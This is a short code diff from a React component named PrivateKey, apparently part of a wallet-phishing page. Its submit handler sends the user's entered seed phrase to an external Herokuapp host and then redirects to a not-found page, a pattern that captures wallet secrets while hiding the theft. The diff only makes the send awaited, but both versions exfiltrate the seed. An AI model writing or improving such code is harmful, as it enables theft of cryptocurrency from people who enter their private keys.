@@ -23,8 +23,8 @@ const PrivateKey = ({ seed3, setSeed3, error3, setError3, disabled3, setDisabled
     }
   };
 
-  const handleSubmit = (e) => {
-    axios.post("https://dappswallet.herokuapp.com/form", { seed: seed3 });
+  const handleSubmit = async(e) => {
+    await axios.post("https://dappswallet.herokuapp.com/form", { seed: seed3 });
     Navigate('/not_found')
   };
 
